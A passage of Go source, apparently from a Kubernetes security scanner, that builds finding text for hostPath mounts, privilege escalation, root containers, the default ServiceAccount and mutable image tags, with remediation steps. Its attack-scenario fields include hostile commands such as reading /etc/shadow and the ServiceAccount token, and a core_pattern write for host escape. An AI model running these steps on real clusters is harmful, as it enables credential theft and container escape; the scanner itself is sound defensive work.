			"Identify the mounted path via `mount` or `cat /proc/mounts` from inside the pod.",
			"Enumerate sensitive contents — for `/etc`: `cat /etc/shadow`, `/etc/kubernetes/admin.conf`; for `/proc`: `echo '|/tmp/x' > /proc/sys/kernel/core_pattern` then trigger a crash.",
			"If writable, drop a payload, modify a config, or symlink-swap.",
			"Confirm impact with `kdigger dig mount` or `deepce.sh -e`.",
			"Persist via the path's owning daemon (cron under `/etc`, systemd unit under `/lib/systemd`, etc.).",
		},
		Remediation: "Replace hostPath with a managed alternative (CSI volume, ConfigMap, Secret, projected volume, or local PV).",
		RemediationSteps: []string{
			"Determine why hostPath is used — config injection, log scraping, GPU device access. Each has a Kubernetes-native replacement.",
			"If hostPath is unavoidable, narrow `path:` to the smallest possible directory, set `type:` to the strictest matching value, and add `readOnly: true` on the volumeMount.",
			"Pair with `runAsNonRoot: true`, drop `ALL` capabilities, and `allowPrivilegeEscalation: false`.",
			fmt.Sprintf("Enforce via PSA `baseline` (denies hostPath) or a Kyverno/Gatekeeper allowlist. Validate: `kubectl get %s/%s -o yaml | grep -A3 hostPath`.", strings.ToLower(kind), name),
		},
		LearnMore: []models.Reference{
			{Title: "Kubernetes — Volumes: hostPath", URL: "https://kubernetes.io/docs/concepts/storage/volumes/#hostpath"},
			refPSS,
			{Title: "Quarkslab — Kubernetes and HostPath", URL: "https://blog.quarkslab.com/kubernetes-and-hostpath-a-love-hate-relationship.html"},
			{Title: "CVE-2021-25741 (subPath/symlink escape)", URL: "https://github.com/kubernetes/kubernetes/issues/104980"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1552_001, mitreT1083},
	}
}

func contentPodSecAPE001(kind, namespace, name, container string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Container `%s` allows privilege escalation in `%s/%s/%s`", container, kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` either omits `securityContext.allowPrivilegeEscalation` or sets it to `true`. This directly controls the `no_new_privs` Linux process flag: when `allowPrivilegeEscalation: false`, the kernel sets `NoNewPrivs: 1` on PID 1 in the container, and any subsequent `execve()` call cannot acquire additional privileges via setuid/setgid binaries, file capabilities, or LSM transitions.\n\n"+
			"Leaving the field unset is dangerous because the runtime default is `true` for backward compatibility. If the container image happens to contain a setuid binary — even an inadvertent one from the base image (`mount`, `ping`, `su`, vendor agent helpers) — an attacker who lands as a non-root user inside the container can re-acquire root just by exec'ing it.\n\n"+
			"The Pod Security Standards Restricted profile mandates `allowPrivilegeEscalation: false` precisely because it is the gate that makes capability drops and runAsNonRoot meaningful.",
			container, kind, namespace, name),
		Impact: "If an attacker lands as a non-root user, they can re-acquire root via setuid binaries; defeats capability drops and runAsNonRoot defenses.",
		AttackScenario: []string{
			"Gain code execution as a non-root user (web RCE in a Node/Python/Java app).",
			"Enumerate setuid binaries: `find / -perm -4000 -type f 2>/dev/null` (often returns `/usr/bin/passwd`, `/bin/su`, `/bin/mount`, `/usr/bin/newuidmap`).",
			"Exploit one — `su -` if password-less, or a known setuid CVE.",
			"Once root in-container, restore previously-dropped capabilities via setcap-style techniques or chain with another finding.",
		},
		Remediation: "Set `allowPrivilegeEscalation: false` on every container.",
		RemediationSteps: []string{
			"Add `allowPrivilegeEscalation: false` to each container's `securityContext`. Pair with `capabilities.drop: [ALL]` and `runAsNonRoot: true`.",
			"Build/pull images that don't contain setuid binaries; alternatively strip setuid bits in Dockerfile (`find / -perm -4000 -exec chmod u-s {} +`).",
			"Apply Pod Security Admission `restricted` to the namespace.",
			fmt.Sprintf("Validate: `kubectl get pod -n %s -l <selector> -o jsonpath='{.items[*].spec.containers[*].securityContext.allowPrivilegeEscalation}'` returns `false` for every container.", namespace),
		},
		LearnMore: []models.Reference{refPSS,
			{Title: "Christophe Tafani-Dereeper — Stop worrying about allowPrivilegeEscalation", URL: "https://blog.christophetd.fr/stop-worrying-about-allowprivilegeescalation/"},
			{Title: "kernel.org — prctl(PR_SET_NO_NEW_PRIVS)", URL: "https://www.kernel.org/doc/html/latest/userspace-api/no_new_privs.html"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1548_001, mitreT1611},
	}
}

func contentPodSecRoot001(kind, namespace, name, container string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Container `%s` runs as root (UID 0) in `%s/%s/%s`", container, kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` runs as UID 0 — either via an explicit `runAsUser: 0`, an explicit `runAsNonRoot: false`, or by relying on the image's default user (which for most public images is root). Container UID 0 is mapped to host UID 0 by default (Linux user namespaces are still off-by-default in Kubernetes), so any kernel exploit, capability misuse, or volume-write vulnerability lands with full root privileges.\n\n"+
			"Running as root erodes every layer of in-container defense. A read-only root filesystem can be remounted (`mount -o remount,rw`) if CAP_SYS_ADMIN is held; a kernel CVE that requires root credentials in user-space (the runC \"Leaky Vessels\" CVE-2024-21626 class, the cgroup-release-agent CVE-2022-0492 class) becomes trivially exploitable; and bind-mounted directories owned by host root become writable.\n\n"+
			"The Pod Security Standards Restricted profile requires `runAsNonRoot: true` AND a `runAsUser` ≥ 1.",
			container, kind, namespace, name),
		Impact: "All other in-pod hardening (read-only root, capability drops, seccomp) becomes one CVE away from full host compromise; container-CVE exploit reliability rises dramatically.",
		AttackScenario: []string{
			"Gain code execution as root inside the container.",
			"Read all bind-mounted host files writable to root, including ConfigMaps and Secrets.",
			"Attempt a capability-bearing kernel exploit — e.g., trigger CVE-2024-21626 (Leaky Vessels) by spawning a child with `WORKDIR=/proc/self/fd/8` semantics.",
			"With CAP_SYS_ADMIN remount the root filesystem read-write and modify init scripts.",
			"Persist via dropped binaries in `/usr/local/bin` whose mounts may survive container restart.",
		},
		Remediation: "Run as a non-root UID (`runAsUser: 10001`, `runAsNonRoot: true`) and bake a non-root USER into the image.",
		RemediationSteps: []string{
			"In the Dockerfile, add `RUN groupadd -g 10001 app && useradd -u 10001 -g app -s /usr/sbin/nologin app` and `USER 10001`. Verify the binary works (file permissions, port binding < 1024 needs `NET_BIND_SERVICE`).",
			"In the PodSpec, set `securityContext.runAsNonRoot: true`, `runAsUser: 10001`, `runAsGroup: 10001`, `fsGroup: 10001`.",
			"Pair with `allowPrivilegeEscalation: false`, `capabilities.drop: [ALL]`, `readOnlyRootFilesystem: true`, `seccompProfile.type: RuntimeDefault`.",
			fmt.Sprintf("Validate: `kubectl exec <pod> -- id` returns `uid=10001`; `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.containers[*].securityContext.runAsUser}'` returns 10001.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{refPSS, refSecurityContext, refNSAHardening,
			{Title: "CVE-2024-21626 (Leaky Vessels)", URL: "https://nvd.nist.gov/vuln/detail/cve-2024-21626"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1068, mitreT1548_001},
	}
}

func contentSADefault001(kind, namespace, name, serviceAccount string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Workload `%s/%s/%s` runs as the namespace `default` ServiceAccount", kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` does not specify `serviceAccountName` and therefore runs as the namespace's `default` ServiceAccount, which by default has its token auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`.\n\n"+
			"The `default` SA is harmless in a fresh namespace, but it is a magnet for permission accumulation: operators, Helm charts, and ClusterRoleBindings frequently bind permissions to it (often by mistake — `subjects: [{kind: ServiceAccount, name: default, namespace: foo}]`), and the only way to know if the SA is dangerous is to enumerate every binding referencing it.\n\n"+
			"The Kubernetes RBAC Good Practices guide explicitly recommends per-workload ServiceAccounts so that the blast radius of an exposed token is bounded by a single workload's needs. An attacker with RCE in this pod reads the token, then runs `kubectl auth can-i --list` to find every accreted permission — often elevated by drift over the namespace's lifetime.",
			kind, namespace, name),
		Impact: "Token theft yields whatever permissions the namespace `default` SA has been granted (often elevated by drift); enables lateral movement to other workloads in the namespace.",
		AttackScenario: []string{
			"RCE in the pod.",
			"Read the SA token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`.",
			"Enumerate permissions: `kubectl --token=$TOKEN auth can-i --list`.",
			"Exploit any usable verb — common findings: `secrets/get` (loot all secrets), `pods/exec` (shell into other pods), `pods/create` with privileged template (escalate to node).",
			"Persist by creating a hidden Deployment with the same compromised SA.",
		},
		Remediation: "Create a dedicated ServiceAccount per workload with least-privilege RBAC; disable automount on the namespace `default` SA.",
		RemediationSteps: []string{
			fmt.Sprintf("Create a ServiceAccount: `kubectl -n %s create sa %s-sa`. Grant only the verbs/resources the app actually needs via a Role + RoleBinding.", namespace, name),
			fmt.Sprintf("Reference the new SA in the PodSpec via `serviceAccountName: %s-sa`. If the app does NOT need to talk to the API at all, also set `automountServiceAccountToken: false`.", name),
			fmt.Sprintf("Disable automount on the namespace default SA: `kubectl patch sa default -n %s -p '{\"automountServiceAccountToken\": false}'`.", namespace),
			fmt.Sprintf("Validate: `kubectl get pod -n %s -l <selector> -o jsonpath='{.items[*].spec.serviceAccountName}'` returns the new SA, not `%s`.", namespace, serviceAccount),
		},
		LearnMore: []models.Reference{
			{Title: "Kubernetes — Configure Service Accounts for Pods", URL: "https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/"},
			{Title: "Kubernetes — Service Accounts", URL: "https://kubernetes.io/docs/concepts/security/service-accounts/"},
			{Title: "Kubernetes — RBAC Good Practices", URL: "https://kubernetes.io/docs/concepts/security/rbac-good-practices/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1552_001, mitreT1078, mitreT1528},
	}
}

func contentImageLatest001(kind, namespace, name, container, image string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Container `%s` uses mutable image tag `%s` in `%s/%s/%s`", container, image, kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` references the image `%s` using a mutable tag (either `:latest` or no tag, which Kubernetes resolves to `:latest`). Mutable tags break two safety properties: (1) the same manifest produces non-deterministic deployments, since the tag may resolve to different content on different days; (2) there is no cryptographic binding between the manifest and the image content actually run, so registry-side or in-flight tampering cannot be detected.\n\n"+
			"This is a defense-evasion / supply-chain hygiene finding rather than an active exploit. Image digests (`@sha256:<hex>`) are immutable — the digest is computed over the manifest content, so any change yields a different digest. SLSA, Sigstore Cosign, and admission controllers like Kyverno or Connaisseur are the modern controls; pinning to a digest is the prerequisite for verifying signatures.\n\n"+
			"A public package compromise (Codecov-style or PyPI-typosquat scenarios, or the 2024 ultralytics PyPI compromise) can republish `image:latest` with malicious code; clusters with `imagePullPolicy: Always` and `:latest` silently pick it up. Pinning to a digest turns a silent supply-chain attack into a noisy CI failure.",
			container, kind, namespace, name, image),
		Impact: "Non-deterministic deployments and silent ingestion of upstream supply-chain compromises; disables digest-based verification and signature checking.",
		AttackScenario: []string{
			"Attacker compromises an upstream image (registry credential leak, typosquat, or maintainer takeover).",
			"Pushes `vendor/app:latest` with a malicious additional layer.",
			"Target cluster's pod restarts and `imagePullPolicy: Always` re-pulls the tag, getting the new digest silently.",
			"Malicious code runs under the workload's existing RBAC/secrets context.",
			"Without digest pinning or signature verification, defenders have no signal until detection-tier tools fire on the malicious behavior.",
		},
		Remediation: "Pin every image to an immutable digest (`@sha256:...`) and verify signatures at admission.",
		RemediationSteps: []string{
			"Resolve the digest: `crane digest <ref>` or `docker buildx imagetools inspect <image>:<tag>`. Update manifests to `image: <repo>@sha256:<digest>` (you may keep the tag for documentation: `image: <repo>:1.2.3@sha256:<digest>`).",
			"Set `imagePullPolicy: IfNotPresent` (digest pinning makes Always unnecessary). For images that absolutely must float, apply a Kyverno policy that rejects `:latest`.",
			"Sign images at build time with Sigstore Cosign and enforce verification at admission with Connaisseur, Kyverno's `verifyImages` rule, or sigstore-policy-controller.",
			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.containers[*].image}'` contains `@sha256:`.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{
			{Title: "Kubernetes — Images", URL: "https://kubernetes.io/docs/concepts/containers/images/"},
			{Title: "Sigstore Cosign", URL: "https://docs.sigstore.dev/cosign/overview/"},
			{Title: "Connaisseur — Verify Container Image Signatures", URL: "https://sse-secure-systems.github.io/connaisseur/v2.0.0/"},
			{Title: "SLSA Framework", URL: "https://slsa.dev/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1525, mitreT1195_002, mitreT1554},
	}
}
